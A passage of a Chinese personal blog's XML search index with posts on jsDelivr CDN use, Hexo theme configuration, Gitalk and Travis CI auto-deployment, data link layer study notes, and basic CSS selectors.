class="string">&quot;zoom:33%;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/20203f67c6b831ace4d1fe4d068600c2cfd6.jpg" style="zoom:20%;" /><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/943a485d76fbbcc50c15a49f5644cbb1.png" style="zoom:33%;" /><p>再配合PicGo，typora，简直不要太爽</p><blockquote><p>注意picgo的代理和本机环境变量代理是冲突的</p></blockquote><p>参考文章</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/76951130">免费CDN：jsDeliver+Github 使用方法</a></p><p><a href="https://removeif.github.io/theme/github-page%E7%BD%91%E7%AB%99cdn%E4%BC%98%E5%8C%96%E5%8A%A0%E9%80%9F.html#lg=1&slide=0">github page网站cdn优化加速</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> 博客 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN </tag>
            
            <tag> jsDeliver </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置amazing主题</title>
      <link href="/TechnicalExperience/Blog/theme-amzing-config.html"/>
      <url>/TechnicalExperience/Blog/theme-amzing-config.html</url>
      
        <content type="html"><![CDATA[<p>发现了hexo上面的有一个很美的主题模板–icraus</p><span id="more"></span><p>我使用的是<a href="https://github.com/removeif/hexo-theme-amazing">remove</a>修改的版本</p><p>照着readme文件进行简单配置可以了</p><h2 id="使用LaTeX语法"><a href="#使用LaTeX语法" class="headerlink" title="使用LaTeX语法"></a>使用LaTeX语法</h2><p>主题的_config.yml配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">plugins:</span></span><br><span class="line"><span class="attr">mathjax:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>哪篇文章需要使用，就在m头部加上</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mathJax:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="添加encrypt插件"><a href="#添加encrypt插件" class="headerlink" title="添加encrypt插件"></a>添加encrypt插件</h2><p>在博客下打开终端，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure><p>博客<code>_config.yml</code>加上全局配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">encrypt:</span> </span><br><span class="line">  <span class="attr">abstract:</span> <span class="string">有东西被加密了,</span> <span class="string">请输入密码查看.</span></span><br><span class="line">  <span class="attr">message:</span> <span class="string">您好,</span> <span class="string">这里需要密码.</span></span><br><span class="line">  <span class="attr">wrong_pass_message:</span> <span class="string">抱歉,</span> <span class="string">这个密码看着不太对,</span> <span class="string">请再试试.</span></span><br><span class="line">  <span class="attr">wrong_hash_message:</span> <span class="string">抱歉,</span> <span class="string">这个文章不能被校验,</span> <span class="string">不过您还是能看看解密后的内容.</span></span><br></pre></td></tr></table></figure><p>也可以在文章开头单独设置</p><h2 id="SEO优化"><a href="#SEO优化" class="headerlink" title="SEO优化"></a>SEO优化</h2><p>打开_config.yml配置文件，找到permalink</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 改为下面这样</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:title.html</span>  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> 博客 </category>
          
          <category> 主题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> icraus </tag>
            
            <tag> amazing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitalk和Travis自动化</title>
      <link href="/TechnicalExperience/Blog/gitalk-Travis-CI.html"/>
      <url>/TechnicalExperience/Blog/gitalk-Travis-CI.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>为了更好的体验及更加方便的写博客</p></blockquote><span id="more"></span><h2 id="Gitalk"><a href="#Gitalk" class="headerlink" title="Gitalk"></a>Gitalk</h2><p>因为主题自带gitalk插件，虽然版本有点老，所以只需申请Github Application即可</p><p><a href="https://github.com/settings/applications/new">点击申请</a></p><p>得到clientID和client Secret填入主题的配置文件即可</p><p>然后推送到仓库，使用管理员账户登录这个网页即可创建issue</p><p>偶尔会出现Error：network error的问题，原因不明</p><blockquote><p>参考<a href="https://www.jianshu.com/p/78c64d07124d">为博客添加 Gitalk 评论插件</a></p></blockquote><p><del>因为文章过多，一个一个取创建太麻烦，于是我找到了自动初始化的方法，</del></p><p>先生成站点地图</p><blockquote><p>参考<a href="https://www.jianshu.com/p/9c2d6db2f855">hexo(3)-生成sitemap站点地图</a></p></blockquote><p>然后我又参考了</p><blockquote><p><a href="https://juejin.im/post/5c0f7951f265da611a47b51a">nodejs版本的Gitalk/Gitment评论自动初始化</a></p><p><a href="https://draveness.me/git-comments-initialize/">自动初始化 Gitalk 和 Gitment 评论</a></p></blockquote><p>一个js脚本，一个ruby脚本</p><p>但我用起来都不理想…</p><p>接着我看到了这个<a href="https://tenfy.cn/2018/11/15/auto-init-comment/">自动初始化gitalk/gitment评论</a>，然后我看到了<a href="https://tenfy.cn/2017/09/08/hexo-auto-deploy/">hexo博客push到github的后自动部署到github pages</a></p><h2 id="Travis-CI"><a href="#Travis-CI" class="headerlink" title="Travis-CI"></a>Travis-CI</h2><p>Travis CI 是在软件开发领域中的一个在线的，分布式的持续集成服务，用来构建及测试在GitHub托管的代码。</p><p><del>由于今天Travis在维护，我也不知道我的部署到底有没有成功</del></p><p><a href="https://travis-ci.com">登录官方网站</a>与github帐号绑定后选择追踪项目，然后在项目根目录添加<code>.travis.yml</code>文件</p><p>因为我的想法是推送博客源码到hexo分支，然后自动部署master分支，贴出我的源码仅供参考</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"><span class="attr">node_js:</span> <span class="string">stable</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">hexo</span></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">hexo</span> <span class="string">g</span></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cd</span> <span class="string">./public</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">init</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.name</span> <span class="string">&quot;manuev&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.email</span> <span class="string">&quot;manu2001@163.com&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">commit</span> <span class="string">-m</span> <span class="string">&quot;Travis CI Auto Builder at $(date +&#x27;%Y-%m-%d&#x27;)&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">push</span> <span class="string">--force</span> <span class="string">--quiet</span> <span class="string">&quot;https://$&#123;ACCESS_TOKEN&#125;@github.com/shepherdev/shepherdev.github.io.git&quot;</span> <span class="string">master:master</span></span><br></pre></td></tr></table></figure><p>推送后可以在travis官网查看实时部署动态，值得一提的是配置的步骤有一行代码报错就会部署失败</p><hr><p>为了搞定Travis我参考了很多文章，都列出了吧，我感觉我还用的到</p><blockquote><p><a href="https://tenfy.cn/2017/09/08/hexo-auto-deploy/">Travis CI官网</a></p><p><a href="http://www.ruanyifeng.com/blog/2017/12/travis_ci_tutorial.html">阮一峰的持续集成服务 Travis CI 教程</a></p><p><a href="https://michael728.github.io/2019/06/16/cicd-hexo-blog-travis/">Github 使用 Travis CI 实现 Hexo 博客自动部署</a></p><p><a href="https://xirikm.net/2019/826-2">使用 Travis CI 实现 Hexo 博客自动部署</a></p><p><a href="https://www.itfanr.cc/2017/08/09/using-travis-ci-automatic-deploy-hexo-blogs/">使用Travis CI自动部署Hexo博客</a></p></blockquote><p><del>因为不知道是维护的缘故还是我操作的缘故导致我一直没弄成功</del></p>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> 博客 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gitalk </tag>
            
            <tag> github </tag>
            
            <tag> Travis CI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据链路层</title>
      <link href="/Networking/NOTE/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82.html"/>
      <url>/Networking/NOTE/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考<a href="https://www.icourse163.org/learn/NJUPT-1001639008?tid=1450250444#/learn/announce">南京邮电大学的网络技术与应用课</a>与Andrew S. Tanenbaum与David J. Wetherall的计算机网络（第五版）</p></blockquote><span id="more"></span><h2 id="1-设计问题"><a href="#1-设计问题" class="headerlink" title="1.设计问题"></a>1.设计问题</h2><p>数据链路层使用物理层提供的服务在通信信道上发送和接收比特，它的功能主要有</p><ul><li>给网络层提供一个定义良好的服务接口</li><li>处理传输错误</li><li>调节数据流，确保慢速的接收方不会被快速的发送方淹没</li></ul><h3 id="1-1成帧"><a href="#1-1成帧" class="headerlink" title="1.1成帧"></a>1.1成帧</h3><p>数据链路层主要将物理层传递的原始数据流拆成离散的“帧”，进行纠错和检错等工作</p><p><strong>成帧的方法</strong></p><ul><li><p>字节计数法</p><p>利用头部的字段来标识该帧的字符数，缺点是当传输错误导致计数值错误，从而会使接收方失去同步（即使想重传也不知道重传的字节），字节计数很少被使用</p></li><li><p>字节填充的标志字节</p><p>考虑了重传问题，每帧使用特殊字节包装了帧的开始和结束，称为<strong>标志字节（flag byte）</strong>，失去同步时就可以搜索两个字节。</p><p>在数据中如果出现标志字节就会导致误判，所以发送方会在这些数据中的标志字节前面加上转义字节（ESC），将分界符与数据分开来，接收方会在接收时删除这些转义字节，这种技术叫字节填充，如果数据中出现转义字节，那就转转义</p><p>缺点：只能使用8bit的字节，帧大小根据内容而定，若没有标志字节，则帧和数据一样长，若都是标志字节，帧增长两倍</p><p>应用：PPP协议</p></li><li><p>比特填充的标志比特法</p><p>这是在比特级成帧的方法，每个帧的开始和结束都有一个特定的<strong>比特模式</strong>（不一定是8bit），01 11 11 10或11 11 11 10标记，这是标记字节。类似字节填充，比特填充就是在发送方的数据中如果出现连续的5个1，就会在后面填充一个0，这样保证了标志字节是唯一的，只出现在边界。</p><p>缺点：帧的长度取决于数据本身，若没有标志字节，则帧和数据一样长，若都是标志字节，由于每个字节都需要转义，帧增长12.5%</p></li><li><p>物理层编码违禁法</p><p>当物理层采用特定的比特编码方法时，利用物理层将比特编码成信号通常包含一些冗余比特，区分帧的开始和结束</p></li></ul><h3 id="1-2差错控制"><a href="#1-2差错控制" class="headerlink" title="1.2差错控制"></a>1.2差错控制</h3><p>当接收方知道帧是否出错（通过纠错码和检错码）时，对于无缺认的无连接服务，只需要保存出境帧就可以，但对于可靠的连接服务，还需要接收方对接收情况进行反馈（返回一个控制帧，会对接收帧进行肯定和否定的确认），若错误则重传</p><p>考虑一种复杂的情况，那就是因为硬件问题导致帧被完全丢失，这时接收方不会由任何反应，发动方也会永久等待下去，这时就要加入计时器，时长要能保证帧到达接收方，当返回确认帧时计时器取消，当帧或确认帧丢失时，计时器触发，解决方案就是重新发送帧，考虑会出现接收方会多次接收同一帧的情况，发送时需要给帧分配序号，接收方就可以区分原始帧和重传帧</p><h3 id="1-3流量控制"><a href="#1-3流量控制" class="headerlink" title="1.3流量控制"></a>1.3流量控制</h3><p>处理发送方发送帧的速度超过接收方接收帧的速度时的问题</p><p>处理的两种方法</p><ul><li><p>基于反馈的流量控制（feedback-based flow control）</p><p>接收方向发送方返回接收信息，允许他发送更多数据，或告诉它自己的情况</p></li><li><p>基于速率的流量控制（rate-based flow control）</p><p>使用这种方法的协议内置的机制，限制发送方的速率</p></li></ul><p>基本上数据链路层的速度都很快，不会丢帧，过载由高层处理</p><h2 id="2-差错检错和纠正"><a href="#2-差错检错和纠正" class="headerlink" title="2.差错检错和纠正"></a>2.差错检错和纠正</h2><p>在传输过程中数据传输数据与元数据不一致就是传输差错，差错控制就是为了检测这个错误和纠正错误的。虽然是在链路层介绍，但数据可靠性是整个系统关注的问题，纠错码也会出现在物理层或者更高的层次，检错码一般是是链路层、网络层、传输层</p><p>每一项技术都适用于不同的位置，在光纤上通常采用检错（误码率低），纠错被用到有噪声的信道上</p><p>两种错误模型：单比特错误和突发性错误，原因：有线信道-脉冲干扰，无线信道-脉冲干扰、脉冲衰弱</p><h3 id="2-1思想"><a href="#2-1思想" class="headerlink" title="2.1思想"></a>2.1思想</h3><p>由于原始数据是独立随机的，需要加入一些数据与原始数据产生约束关系，这些数据相对于原始数据是多余的，在一定程度上会降低传输效率</p><h3 id="2-2方式"><a href="#2-2方式" class="headerlink" title="2.2方式"></a>2.2方式</h3><ul><li>检错重发</li><li>前向纠错（FEC）</li><li>混合纠错检错</li><li>信息反馈</li></ul><h3 id="2-3纠错码"><a href="#2-3纠错码" class="headerlink" title="2.3纠错码"></a>2.3纠错码</h3><ul><li>海明码</li><li>二进制卷积码</li><li>里德所罗门码</li><li>低密度奇偶校验码</li></ul><h3 id="2-4检错码"><a href="#2-4检错码" class="headerlink" title="2.4检错码"></a>2.4检错码</h3><h4 id="2-4-1奇偶校验码"><a href="#2-4-1奇偶校验码" class="headerlink" title="2.4.1奇偶校验码"></a>2.4.1奇偶校验码</h4><p>原理：在传输数据后加监督位，使它有奇数个1或偶数个1</p><p>缺点：只能检测出奇数个错，若出错两个位则检测不出</p><h4 id="2-4-2循环冗余码"><a href="#2-4-2循环冗余码" class="headerlink" title="2.4.2循环冗余码"></a>2.4.2循环冗余码</h4><p>CRC（Cyclic Redundancy Check）比奇偶校验码的方式的检错能力更强</p><p>原理：将原有数据$M(k位)$后面添加差错检测的$n$位冗余码，构成帧发出去，发出去（k+n）位</p><p>冗余码算法</p><ul><li>首先进行$M=2^n×M$运算，就是在后面添加n个0</li><li>然后使用 $M$ 对约定好的n+1位的 $P$ 数据进行模2除运算（异或XOR，相同为0,不同为1），模运算不借位，$P$ 是根据生成多项式 $G(x)$ 而来</li><li>得到的余数 $R$ 就是FCS（帧检测序列）</li><li>真正要发送的就是$2^nM+R$</li><li>接收方使用发送的数据模2除 $P$，余数为0则没有错误</li></ul><p>设发送的数据为$C(x)$，则有</p><p>$$<br>C(x)=2^nM(x)+R(x)<br>$$</p><p>特点：</p><ul><li>CRC只能做到无差错接收</li><li>若要可靠传输，则需要加上确认和重传机制</li></ul><h2 id="3-基本数据链路协议"><a href="#3-基本数据链路协议" class="headerlink" title="3.基本数据链路协议"></a>3.基本数据链路协议</h2><h2 id="4-MAC"><a href="#4-MAC" class="headerlink" title="4.MAC"></a>4.MAC</h2><p>该笔记终止记录</p><blockquote><p>由于书上自下向上开始介绍，内容比较晦涩、难读，我还是基础不好只能与这本书暂时再见了，等我深造时在开启这本书。</p><p>换个思路重新学网络，找到了<em>《计算机网络自顶向下方法》</em>开始学习，待我学成，必将开启新篇章！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> NOTE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 帧 </tag>
            
            <tag> 差错控制 </tag>
            
            <tag> 奇偶校验码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS基础</title>
      <link href="/Front-end/CSS/CSS%E5%9F%BA%E7%A1%80.html"/>
      <url>/Front-end/CSS/CSS%E5%9F%BA%E7%A1%80.html</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>层叠样式表<code>Cascading style sheets</code></p><ul><li><p>可以用来给网页创建样式表，对网页进行修饰</p></li><li><p>层叠就是多层结构，高的可以覆盖低的</p></li><li><p>css可以为网页每个层次设置样式</p></li></ul></blockquote><span id="more"></span><p>例子</p><ul><li>内联样式</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:red;font-size:100px;&quot;</span>&gt;</span>这是一段内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><pre><code>在元素的的style属性中编写样式缺点：相当于表现与**结构耦合**，不易**复用**，不推荐使用</code></pre><ul><li><p>内部样式</p><p>通过CSS选择器选中指定样式</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;type/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">p</span>&#123;</span></span><br><span class="line"><span class="css">    <span class="attribute">color</span>:red;</span></span><br><span class="line"><span class="css">    <span class="attribute">font-size</span>:<span class="number">100px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><pre><code>但还是有缺点，那就是只在一个页面起作用</code></pre><ul><li><p>外部样式表</p><p>title进一步复用，利用link链接多个网页，方便管理</p><p>使用步骤：</p><p>1.创建<code>.css</code>文件，内容如下</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>2.在需要样式的网页头部，引入`.css`文件</code></pre><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;.css文件路径&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><pre><code>优点：提高网页访问效率（在缓存里访问同一个css文件），完全使结构和表现分离，最大程度进行复用，用我的话讲就是方便维护，减少代码冗余</code></pre><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul><li><p>选择器(选择指定元素)+声明块(修饰指定元素)</p><ul><li><code>h1&#123;color:red;&#125;</code></li></ul></li><li><p>用<code>/*我的注释内容*/</code>注释</p></li></ul><h3 id="常用选择器"><a href="#常用选择器" class="headerlink" title="常用选择器"></a>常用选择器</h3><h4 id="1-id选择器"><a href="#1-id选择器" class="headerlink" title="1.id选择器"></a>1.id选择器</h4><p>通过元素的id属性可以选中<strong>唯一</strong>的一个元素</p><ul><li>语法</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#id</span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>注意<ul><li>id不能重复</li></ul></li></ul><h4 id="2-类选择器"><a href="#2-类选择器" class="headerlink" title="2.类选择器"></a>2.类选择器</h4><p>通过class属性选中<strong>一组</strong>元素</p><ul><li>语法</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.class</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>并且可以用空格设置多个属性值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;tag1 tag2&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-并集选择器"><a href="#3-并集选择器" class="headerlink" title="3.并集选择器"></a>3.并集选择器</h4><p>将选择器分组</p><ul><li>语法</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.class1</span>,<span class="selector-id">#id1</span>,<span class="selector-tag">p</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>满足一个条件即可</p><h4 id="4-通配选择器"><a href="#4-通配选择器" class="headerlink" title="4.通配选择器"></a>4.通配选择器</h4><p>选择所有元素</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="5-交集选择器"><a href="#5-交集选择器" class="headerlink" title="5.交集选择器"></a>5.交集选择器</h4><ul><li><p>满足所有条件才行</p></li><li><p>id一般不用这个，因为id可以确定唯一元素</p></li><li><p>语法</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.class1</span><span class="selector-class">.clss2</span>&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="元素之间的关系"><a href="#元素之间的关系" class="headerlink" title="元素之间的关系"></a>元素之间的关系</h3><ul><li><p>父元素：直接包含子元素的元素</p></li><li><p>子元素：直接被父元素包含的元素</p></li><li><p>祖先元素：直接或间接包含后代元素的元素</p></li><li><p>后代元素：直接或间接被祖先元素包含的元素</p></li></ul><h4 id="后代选择器"><a href="#后代选择器" class="headerlink" title="后代选择器"></a>后代选择器</h4><ul><li><p>选中指定指定元素的后代元素，范围大</p></li><li><p>语法</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#id1</span> <span class="selector-tag">span</span>&#123;&#125;</span><br><span class="line"><span class="selector-class">.class1</span> <span class="selector-tag">span</span> <span class="selector-tag">span</span>&#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="子代选择器"><a href="#子代选择器" class="headerlink" title="子代选择器"></a>子代选择器</h4><ul><li><p>选中指定父元素的子元素</p></li><li><p>语法</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &gt; <span class="selector-tag">span</span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>兼容性<ul><li>IE6不支持  </li></ul></li></ul><h4 id="兄弟选择器"><a href="#兄弟选择器" class="headerlink" title="兄弟选择器"></a>兄弟选择器</h4><ul><li><p>选中指定元素的后面元素</p></li><li><p>语法</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*指定选中紧挨的一个元素*/</span></span><br><span class="line"><span class="selector-tag">div</span> + <span class="selector-tag">p</span>&#123;&#125;</span><br><span class="line"><span class="comment">/*选中div后面所有的p元素*/</span></span><br><span class="line"><span class="selector-tag">div</span> ~ <span class="selector-tag">p</span>&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="其他的选择器"><a href="#其他的选择器" class="headerlink" title="其他的选择器"></a>其他的选择器</h3><p>伪类选择器</p><p>代表访问的状态</p><ul><li>未访问的链接</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>访问过的链接</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>&#123;&#125;</span><br><span class="line"><span class="comment">/*因为隐私原因，只可设置color*/</span></span><br></pre></td></tr></table></figure><ul><li>鼠标滑过链接</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>鼠标点击链接</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span>&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>link visited hover active</code>最好按照顺序写，不然会有的属性冲突不会生效（它们的优先级是一样的 ）</p></blockquote><ul><li>有两个伪类适用于其他标签</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:hover</span></span><br><span class="line"><span class="selector-pseudo">:active</span></span><br></pre></td></tr></table></figure><blockquote><p>:warning: IE6不兼容</p></blockquote><ul><li>文本框获取焦点时的状态</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:focus</span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>选中时的状态，适用于大多浏览器</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">::selection</span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>火狐要用</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::-moz-selection</span><br></pre></td></tr></table></figure><h4 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器"></a>伪元素选择器</h4><p>伪元素一般指一些特殊位置</p><p>CSS3 引入 <code>::before</code> 是为了将<a href="https://developer.mozilla.org/en-US/docs/CSS/Pseudo-classes">伪类</a>和<a href="https://developer.mozilla.org/en-US/docs/CSS/Pseudo-elements">伪元素</a>区别开来。浏览器也接受由CSS 2 引入的<code>:before</code> 写法。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:first</span>-letter<span class="comment">/*目前发现a,span不能用*/</span></span><br><span class="line"><span class="selector-pseudo">:first</span>-line<span class="comment">/*目前发现a,span不能用*/</span></span><br><span class="line">:before&#123;</span><br><span class="line">    content:<span class="string">&quot;在元素最前面&quot;</span>;</span><br><span class="line">&#125;<span class="comment">/*用content添加内容*/</span></span><br><span class="line">:after&#123;</span><br><span class="line">content:<span class="string">&quot;在元素最后面&quot;</span>;</span><br><span class="line">&#125;<span class="comment">/*用content添加内容*/</span></span><br></pre></td></tr></table></figure><ul><li>ie6不支持</li></ul><h4 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h4><p>每个标签都可以有<code>title=&quot; &quot;</code>这个属性</p><ul><li>列举一些常用的</li></ul><p><code>标签名[属性名]&#123;&#125;</code></p><p><code>标签名[属性名=属性值]&#123;&#125;</code></p><p><code>标签名[属性名^=某字符]</code></p><ul><li>选择字符开头的属性的标签</li></ul><p><code>标签名[属性名$=某字符]</code></p><ul><li>选择字符结尾的属性的标签</li></ul><p><code>标签名[属性名*=某字符]</code></p><ul><li>选择含有字符的属性的标签</li></ul><h4 id="子元素选择器"><a href="#子元素选择器" class="headerlink" 